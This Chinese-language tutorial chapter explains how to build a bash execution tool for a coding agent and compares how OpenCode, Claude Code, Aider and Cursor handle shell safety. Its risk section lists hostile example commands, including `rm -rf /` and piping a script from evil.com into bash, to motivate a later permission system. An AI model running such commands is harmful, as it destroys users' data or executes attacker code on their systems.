# Stage 07 — Shell 执行工具（bash）

> **承上**：Stage 05-06 让 Agent 能读、写、搜索文件
> **启下**：命令执行是最强大的工具也最危险，引出 Stage 08 的权限系统

---

## 学习目标

1. 理解 Agent 执行命令的完整流程（启动进程、捕获输出、超时控制）
2. 掌握 stdout/stderr 分离和 exit code 处理
3. 认识命令执行的安全风险

## 核心概念

### 命令执行的三个输出

```
$ npm test

stdout: "PASS 3 tests"
stderr: "node: warning: ..."     ← stderr 不一定是错误
exit code: 0                     ← 0 = 成功，非 0 = 失败
```

Agent 需要同时看到 stdout、stderr 和 exit code，才能正确理解执行结果。

### 安全风险

`bash` 工具让 LLM 获得了执行任意命令的能力：
- `rm -rf /` — 灾难性破坏
- `curl evil.com/stealer.sh | bash` — 远程代码执行
- `git push --force origin main` — 改写 Git 历史
- `npm publish` — 不小心发布到公共仓库

## 产出物

在 Stage 06 基础上：
- `tools/bash.ts` — 命令执行工具
- 添加工作目录（cwd）概念
- 添加超时控制（如 30 秒）

## 实现要点

- 使用 `child_process.exec` 或 `spawn` 执行命令
- 设置 `cwd` 为项目根目录
- 设置 `timeout` 超时（如 30 秒）
- 将 stdout + stderr + exitCode 一起返回
- 限制输出长度（如最多 10000 字符）
- **先不加权限控制**（那属于 Stage 08）

---

## 技术洞察

### OpenCode 的做法

OpenCode 的命令执行有几个精细设计：

1. **伪终端（PTY）执行**
   不是简单的 `exec`，而是在 PTY 中执行。这意味着：
   - 支持交互式命令（如 `npm init`）
   - 保留 ANSI 颜色和格式
   - TUI 可以显示"实时终端"

2. **Effect-TS ChildProcess**
   OpenCode 用 Effect-TS 的 ChildProcess 模块管理子进程：
   - 结构化并发的进程管理
   - Fiber-based 的流式读取
   - 自动资源清理

3. **限制性环境变量**
   命令执行时过滤掉敏感环境变量（如 API keys）。

### 对比其他 Agent

| Agent | Shell 实现 | 安全措施 |
|-------|-----------|---------|
| **OpenCode** | PTY + Effect-TS ChildProcess | 权限系统、环境隔离 |
| **Claude Code** | Bash tool，沙箱执行 | 用户确认 |
| **Aider** | 命令执行 | 有限的命令白名单 |
| **Cursor** | Terminal 集成 | IDE 沙箱 |

### 关键洞察

Shell 工具是 Agent 能力的**放大器**，也是风险的**放大器**：

- **一个 `read` 只能看一个文件；一个 `grep` 能找一个模式；但一个 `bash` 可以 `grep -r + sed + git + npm install + ...`**
- 这正是为什么 OpenCode 把 `bash` 的权限控制做得最细粒度（glob 匹配命令内容）
- Claude Code 的策略不同：让每个"危险"操作都需要人工确认——这是 Anthropic 的安全哲学

**下一步**：有了命令执行工具，权限控制变得必须。Stage 08 实现权限系统。